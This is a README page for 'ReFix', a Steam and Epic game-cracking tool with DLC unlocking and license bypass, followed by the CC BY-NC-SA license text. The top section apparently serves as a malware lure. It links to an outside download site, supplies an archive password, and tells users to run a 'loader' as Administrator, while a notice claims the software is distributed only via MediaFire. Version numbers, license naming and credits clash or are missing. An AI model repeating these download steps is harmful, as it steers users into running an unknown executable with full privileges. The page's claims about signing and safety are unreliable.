<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## 🔍 How ReFix Compares

| Feature | ReFix v1.4.0 | OnlineFix (online-fix.me) | Goldberg Emulator (gbe_fork) | CODEX Steam Emu | SmartSteamEmu (SSE) |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **Open Source (Full C++ Source)** | ✅ **Yes (CC BY-NC-SA)** | ❌ Closed / Obfuscated | ✅ Yes (GPL/MIT) | ❌ Closed Source | ❌ Closed / Abandoned |
| **Steam Online Matchmaking (Spacewar 480)** | ✅ **Yes** | ✅ Yes | ❌ No (LAN only) | ❌ No (Offline only) | ❌ No (LAN only) |
| **100% Offline LAN Play (No Steam Required)** | ✅ **Yes (gbe_fork)** | ❌ No | ✅ Yes | ⚠️ Offline solo | ✅ Yes (Legacy LAN) |
| **Universal DLC Auto-Unlocker** | ✅ **Yes (SmokeAPI/CreamAPI)** | ⚠️ Manual / Partial | ⚠️ Config file only | ⚠️ INI list only | ⚠️ INI list only |
| **Interactive GUI Executable Picker** | ✅ **Yes (`select_exe.ps1`)** | ❌ No | ❌ No | ❌ No | ❌ No |
| **Smart Multi-Engine Detection (Unity/Unreal/Godot/Native)** | ✅ **Yes (Automated)** | ❌ No | ❌ No | ❌ No | ❌ No |
| **Modular Epic Online Services (EOS / RedboneEOS)** | ✅ **Yes (Modular v3)** | ⚠️ Custom patches | ❌ No | ❌ No | ❌ No |
| **Automatic Windows Defender Firewall Rules** | ✅ **Yes** | ❌ No | ❌ No | ❌ No | ❌ No |
| **Steam Non-Steam Shortcut Auto-Injector** | ✅ **Yes (`shortcuts.vdf`)** | ❌ No | ❌ No | ❌ No | ❌ No |
| **Clean Zero-Trace Uninstaller & Game Restorer** | ✅ **Yes (1-Click)** | ❌ No | ❌ No | ❌ No | ❌ No |
| **Digitally Signed Binaries** | ✅ **Yes (BlueStar Developers)** | ❌ No | ❌ No | ❌ No | ❌ No |


---

## 🎮 How It Works

### Mode 1 — ReFix Online via Steam (Spacewar 480)
* Hooks straight into your running Steam client by masking your game under Valve's Spacewar (AppID 480).
* Lets you use real Steam infrastructure: global server lists, P2P NAT punch-through, Steam Relay, in-game invites, and the Shift+Tab overlay.
* Automatically injects the game's real AppID into lobby metadata so you only match with other players running the same game.

### For DLC Unlocking Only

1. Run **`DLC_Unlocker.bat`**.
2. Select your game folder.
3. Choose whether to unlock all DLCs, choose specific ones, or reset back to vanilla.

### Want to Uninstall or Restore Everything?

No stress! Just run **`Uninstall_ReFix.bat`**, select your game folder, and it will safely restore all original DLLs (`.orig`, `_valve.dll`, `_o.dll`), remove all proxies and configs, and leave your game completely untouched.

---

## 📂 Project Structure

```
ReFix/
├── AutoDeploy.bat                      # 1-Click universal auto-deploy setup tool
├── DLC_Unlocker.bat                    # Universal DLC Unlocker (SmokeAPI / CreamAPI)
├── Uninstall_ReFix.bat                 # Zero-trace uninstaller & clean game restorer
├── build.bat                           # 1-Click MSVC build script for all C++ proxies
├── deploy.bat                          # Packaging script for releases
├── ReFix.ini                           # Central configuration template
├── README.md                           # Documentation & quick start guide
├── bin/                                # Deployment binaries and helper scripts
│   ├── steam_api64.dll                 # ReFix Steamworks proxy (Signed)
│   ├── winmm.dll                       # Startup loader & overlay hook (Signed)
│   ├── EOSSDK-Win64-Shipping.dll       # Epic Online Services auth proxy (Signed)
│   ├── RedboneEOS.dll                  # Redpoint EOS bridge proxy (Signed)
│   ├── ReFixSync.dll                   # Synchronization helper
│   ├── detect_game.ps1                 # Smart engine and binary detector
│   ├── deploy_helper.ps1               # Deployment and configuration synchronizer
│   ├── select_dlcs.ps1                 # Steam Store DLC scraper
│   ├── dlc_unlocker.ps1                # SmokeAPI/CreamAPI deployment manager
│   ├── select_folder.ps1               # GUI folder selection dialog
│   ├── select_exe.ps1                  # GUI executable picker dialog
│   ├── apply_firewall.ps1              # Windows Defender Firewall helper
│   ├── add_steam_shortcut.ps1          # Steam shortcuts.vdf binary injector
│   ├── goldberg/                       # Standalone Goldberg LAN emulator files
│   ├── bepinex/                        # BepInEx runtime loader
│   └── tools/                          # Steamless unpacking utilities
└── src/                                # Complete C++ source code
    ├── winmm_proxy.cpp                 # winmm.dll loader & hooking entry point
    ├── steam_proxy.cpp                 # steam_api64.dll proxy & Steamworks wrapper
    ├── eos_proxy.cpp                   # Epic Online Services session & auth emulator
    ├── unreal_detect.cpp               # Unreal Engine subsystem detection
    ├── unreal_steam_emu.cpp            # Unreal Engine Steam adapter
    ├── upnp_firewall.cpp               # Firewall automation routines
    ├── server_browser_gui.cpp          # In-game ImGui server browser
    ├── include/                        # Steamworks SDK headers
    └── minhook/                        # MinHook library
```

---

## ⚙️ Configuration Reference (`ReFix.ini`)

You can tweak game-specific behavior anytime by opening `ReFix.ini` in your game's directory:

```ini
[Game]
GameName=GenericGame            ; Game title for logging and window titles
EngineType=Auto                 ; Auto | Unity | Unreal | Godot | Native

[Online]
Mode=valve                      ; valve (Steam Online 480) | goldberg (LAN Offline)

[Steam]
MaskAppId=480                   ; Steam AppID used for masking (Default: Spacewar 480)
RealAppId=                      ; Real Steam AppID for DLCs and metadata (e.g. 550)
Language=english                ; Game language
BypassLicenseCheck=true         ; Allow running without Steam store ownership
DLCs=all                        ; all | none | comma-separated AppIDs

[Matchmaking]
EnableLobbyFilter=false         ; Filter lobbies by custom metadata key
LobbyFilterKey=game_filter      ; Metadata key for game filtering
LobbyFilterValue=               ; Custom filter value (defaults to RealAppId)
LobbyDistanceFilter=Worldwide   ; Close | Default | Far | Worldwide
MaxLobbyResults=50              ; Max lobbies to return in server browser

[Overlay]
EnableOverlay=true              ; Enable Steam Shift+Tab overlay hook
OverlayAppId=480                ; AppID for overlay initialization

[EOS]
DeviceIdAuth=true               ; Emulate Epic Online Services DeviceID login

[User]
Name=Player                     ; Custom player name (or leave empty for auto)
SteamId=                        ; Custom SteamID64 (or leave empty for auto)

[Network]
ListenPort=47584                ; UDP port for LAN discovery
CustomBroadcasts=               ; Extra broadcast IPs for VPNs (comma-separated)
```

---

## 🛠️ Building from Source

### Prerequisites
* **Windows 10 / 11 (64-bit)**
* **Visual Studio 2022** (Community, Professional, or Enterprise) with the **Desktop development with C++** workload installed (includes MSVC v143 and MASM `ml64.exe`).

### 1-Click Compilation
Open a **Developer Command Prompt for VS 2022** (x64) and simply run:
```cmd
build.bat
```
`build.bat` takes care of the whole pipeline:
1. Detects your MSVC environment automatically via `vswhere.exe`.
2. Assembles the forwarding tables (`winmm_fwd.asm`, `eos_fwd.asm`, `steam_fwd.asm`) using `ml64.exe`.
3. Builds `winmm.dll`, `EOSSDK-Win64-Shipping.dll`, `RedboneEOS.dll`, and `steam_api64.dll` with full optimization (`/O2 /EHsc /LD`).
4. Outputs the finished binaries to `build/` and copies them directly into `bin/`.

---

## 💖 Credits & Big Thanks

ReFix wouldn't be possible without the incredible work done by the open-source and modding communities:

## ⚖️ License

Distributed under the **Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)** License.

* **Share & Adapt**: You're free to copy, modify, and build upon this project.
* **Non-Commercial**: Strictly for non-commercial and educational use. Keep it free!
* **ShareAlike**: If you distribute modified versions, keep them under this same open license.

See `LICENSE` for the full legal text.


---

Creative Commons Legal Code

CC0 1.0 Universal / Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International
===========================================================================================

Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International Public License

By exercising the Licensed Rights (defined below), You accept and agree to be bound by the terms and conditions of this Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International Public License ("Public License"). To the extent this Public License may be interpreted as a contract, You are granted the Licensed Rights in consideration of Your acceptance of these terms and conditions, and the Licensor grants You such rights in consideration of benefits the Licensor receives from making the Licensed Material available under these terms and conditions.

Section 1 – Definitions.

a. Adapted Material means material in any medium or format that is derived from or based upon the Licensed Material and in which the Licensed Material is translated, altered, arranged, transformed, or otherwise modified in a manner requiring permission under the Copyright and Similar Rights held by the Licensor. For purposes of this Public License, where the Licensed Material is a musical work, performance, or sound recording, Adapted Material is always produced where the Licensed Material is synched in timed relation with a moving image.
b. Adapter's License means the license You apply to Your Copyright and Similar Rights in Your contributions to Adapted Material in accordance with the terms and conditions of this Public License.
c. BY-NC-SA Compatible License means a license listed at creativecommons.org/compatiblelicenses, approved by Creative Commons as essentially the equivalent of this Public License.
d. Copyright and Similar Rights means copyright and/or similar rights closely related to copyright including, without limitation, performance, broadcast, sound recording, and Sui Generis Database Rights, without regard to how the rights are labeled or categorized. For purposes of this Public License, the rights specified in Section 2(b)(1)-(2) are not Copyright and Similar Rights.
e. Effective Technological Measures means those measures that, in the absence of proper authority, may not be circumvented under laws fulfilling obligations under Article 11 of the WIPO Copyright Treaty adopted on December 20, 1996, and/or similar international agreements.
f. Exceptions and Limitations means fair use, fair dealing, and/or any other exception or limitation to Copyright and Similar Rights that applies to Your use of the Licensed Material.
g. License Elements means the license attributes listed in the name of a Creative Commons Public License. The License Elements of this Public License are Attribution, NonCommercial, and ShareAlike.
h. Licensed Material means the artistic or literary work, database, or other material to which the Licensor applied this Public License.
i. Licensed Rights means the rights granted to You subject to the terms and conditions of this Public License, which are limited to all Copyright and Similar Rights that apply to Your use of the Licensed Material and that the Licensor has authority to license.
j. Licensor means the individual(s) or entity(ies) granting rights under this Public License.
k. NonCommercial means not primarily intended for or directed towards commercial advantage or monetary compensation. For purposes of this Public License, the exchange of the Licensed Material for other material subject to Copyright and Similar Rights by digital file-sharing or similar means is NonCommercial provided there is no payment of monetary compensation in connection with the exchange.
l. Share means to provide material to the public by any means or process that requires permission under the Licensed Rights, such as reproduction, public display, public performance, distribution, dissemination, communication, or importation, and to make material available to the public including in ways that members of the public may access the material from a place and at a time individually chosen by them.
m. Sui Generis Database Rights means rights other than copyright resulting from Directive 96/9/EC of the European Parliament and of the Council of 11 March 1996 on the legal protection of databases, as amended and/or succeeded, as well as other essentially equivalent rights anywhere in the world.
n. You means the individual or entity exercising the Licensed Rights under this Public License. Your has a corresponding meaning.

Section 2 – Scope.

a. License grant.
1. Subject to the terms and conditions of this Public License, the Licensor hereby grants You a worldwide, royalty-free, non-sublicensable, non-exclusive, irrevocable license to exercise the Licensed Rights in the Licensed Material to:
A. reproduce and Share the Licensed Material, in whole or in part, for NonCommercial purposes only; and
B. produce, reproduce, and Share Adapted Material for NonCommercial purposes only.
2. Exceptions and Limitations. For the avoidance of doubt, where Exceptions and Limitations apply to Your use, this Public License does not apply, and You do not need to comply with its terms and conditions.
3. Term. The term of this Public License is specified in Section 6(a).
4. Media and formats; technical modifications allowed. The Licensor authorizes You to exercise the Licensed Rights in all media and formats whether now known or hereafter created, and to make technical modifications necessary to do so. The Licensor waives and/or agrees not to assert any right or authority to forbid You from making technical modifications necessary to exercise the Licensed Rights, including technical modifications necessary to circumvent Effective Technological Measures. For purposes of this Public License, simply making modifications authorized by this Section 2(a)(4) never produces Adapted Material.
5. Downstream recipients.
A. Offer from the Licensor – Licensed Material. Every recipient of the Licensed Material automatically receives an offer from the Licensor to exercise the Licensed Rights under the terms and conditions of this Public License.
B. Additional offer from the Licensor – Adapted Material. Every recipient of Adapted Material from You automatically receives an offer from the Licensor to exercise the Licensed Rights in the Adapted Material under the conditions of the Adapter's License You apply.
C. No downstream restrictions. You may not offer or impose any additional or different terms or conditions on, or apply any Effective Technological Measures to, the Licensed Material if doing so restricts exercise of the Licensed Rights by any recipient of the Licensed Material.
6. No endorsement. Nothing in this Public License constitutes or may be construed as permission to assert or imply that You are, or that Your use of the Licensed Material is, connected with, or sponsored, endorsed, or granted official status by, the Licensor or others designated to receive attribution as provided in Section 3(a)(1)(A)(i).

b. Other rights.
1. Moral rights, such as the right of integrity, are not licensed under this Public License, nor are publicity, privacy, and/or other similar personality rights; however, to the extent possible, the Licensor waives and/or agrees not to assert any such rights held by the Licensor to the limited extent necessary to allow You to exercise the Licensed Rights, but not otherwise.
2. Patent and trademark rights are not licensed under this Public License.
3. To the extent possible, the Licensor waives any right to collect royalties from You for the exercise of the Licensed Rights, whether directly or through a collecting society under any voluntary or waivable statutory or compulsory licensing scheme. In all other cases the Licensor expressly reserves any right to collect such royalties, including when the Licensed Material is used other than for NonCommercial purposes.

Section 3 – License Conditions.

Your exercise of the Licensed Rights is expressly made subject to the following conditions.

a. Attribution.
1. If You Share the Licensed Material (including in modified form), You must:
A. retain the following if it is supplied by the Licensor with the Licensed Material:
i. identification of the creator(s) of the Licensed Material and any others designated to receive attribution, in any reasonable manner requested by the Licensor (including by pseudonym if designated);
ii. a copyright notice;
iii. a notice that refers to this Public License;
iv. a notice that refers to the disclaimer of warranties;
v. a URI or hyperlink to the Licensed Material to the extent reasonably practicable;
B. indicate if You modified the Licensed Material and retain an indication of any previous modifications; and
C. indicate the Licensed Material is licensed under this Public License, and include the text of, or the URI or hyperlink to, this Public License.
2. You may satisfy the conditions in Section 3(a)(1) in any reasonable manner based on the medium, means, and context in which You Share the Licensed Material. For example, it may be reasonable to satisfy the conditions by providing a URI or hyperlink to a resource that includes the required information.
3. If requested by the Licensor, You must remove any of the information required by Section 3(a)(1)(A) to the extent reasonably practicable.

b. ShareAlike.
In addition to the conditions in Section 3(a), if You Share Adapted Material You produce, the following conditions also apply.
1. The Adapter's License You apply must be a Creative Commons license with the same License Elements, this version or later, or a BY-NC-SA Compatible License.
2. You must include the text of, or the URI or hyperlink to, the Adapter's License You apply. You may satisfy this condition in any reasonable manner based on the medium, means, and context in which You Share Adapted Material.
3. You may not offer or impose any additional or different terms or conditions on, or apply any Effective Technological Measures to, Adapted Material that restrict exercise of the rights granted under the Adapter's License You apply.

Section 4 – Sui Generis Database Rights.

Where the Licensed Rights include Sui Generis Database Rights that apply to Your use of the Licensed Material:
a. for the avoidance of doubt, Section 2(a)(1) grants You the right to extract, reuse, reproduce, and Share all or a substantial portion of the contents of the database for NonCommercial purposes only;
b. if You include all or a substantial portion of the contents of the database in a database in which You have Sui Generis Database Rights, then the database in which You have Sui Generis Database Rights (but not its individual contents) is Adapted Material, including for purposes of Section 3(b); and
c. You must comply with the conditions in Section 3(a) if You Share all or a substantial portion of the contents of the database.
For the avoidance of doubt, this Section 4 supplements and does not replace Your obligations under this Public License where the Licensed Rights include other Copyright and Similar Rights.

Section 5 – Disclaimer of Warranties and Limitation of Liability.

a. Unless otherwise separately undertaken by the Licensor, to the extent possible, the Licensor offers the Licensed Material as-is and as-available, and makes no representations or warranties of any kind concerning the Licensed Material, whether express, implied, statutory, or other. This includes, without limitation, warranties of title, merchantability, fitness for a particular purpose, non-infringement, absence of latent or other defects, accuracy, or the presence or absence of errors, whether or not known or discoverable. Where disclaimers of warranties are not allowed in full or in part, this disclaimer may not apply to You.
b. To the extent possible, in no event will the Licensor be liable to You on any legal theory (including, without limitation, negligence) or otherwise for any direct, special, indirect, incidental, exemplary, or punitive losses, costs, expenses, or damages arising out of this Public License or use of the Licensed Material, even if the Licensor has been advised of the possibility of such losses, costs, expenses, or damages. Where a limitation of liability is not allowed in full or in part, this limitation may not apply to You.
c. The disclaimer of warranties and limitation of liability provided above shall be interpreted in a manner that, to the extent possible, most closely approximates an absolute disclaimer and waiver of all liability.

Section 6 – Term and Termination.

a. This Public License applies for the term of the Copyright and Similar Rights licensed here. However, if You fail to comply with this Public License, then Your rights under this Public License terminate automatically.
b. Where Your right to use the Licensed Material has terminated under Section 6(a), it reinstates:
1. automatically as of the date the violation is cured, provided it is cured within 30 days of Your discovery of the violation; or
2. upon express reinstatement by the Licensor.
For the avoidance of doubt, this Section 6(b) does not affect any right the Licensor may have to seek remedies for Your violations of this Public License.
c. For the avoidance of doubt, the Licensor may also offer the Licensed Material under separate terms or conditions or stop distributing the Licensed Material at any time; however, doing so will not terminate this Public License.
d. Sections 1, 5, 6, 7, and 8 survive termination of this Public License.

Section 7 – Other Terms and Conditions.

a. The Licensor shall not be bound by any additional or different terms or conditions communicated by You unless expressly agreed.
b. Any arrangements, understandings, or agreements regarding the Licensed Material not stated herein are separate from and independent of the terms and conditions of this Public License.

Section 8 – Interpretation.

a. For the avoidance of doubt, this Public License does not, and shall not be interpreted to, reduce, limit, restrict, or impose conditions on any use of the Licensed Material that could lawfully be made without permission under this Public License.
b. To the extent possible, if any provision of this Public License is deemed unenforceable, it shall be automatically reformed to the minimum extent necessary to make it enforceable. If the provision cannot be reformed, it shall be severed from this Public License without affecting the enforceability of the remaining terms and conditions.
c. No term or condition of this Public License will be waived and no failure to comply consented to unless expressly agreed to by the Licensor.
d. Nothing in this Public License constitutes or may be interpreted as a limitation upon, or waiver of, any privileges and immunities that apply to the Licensor or You, including from the legal processes of any jurisdiction or authority.
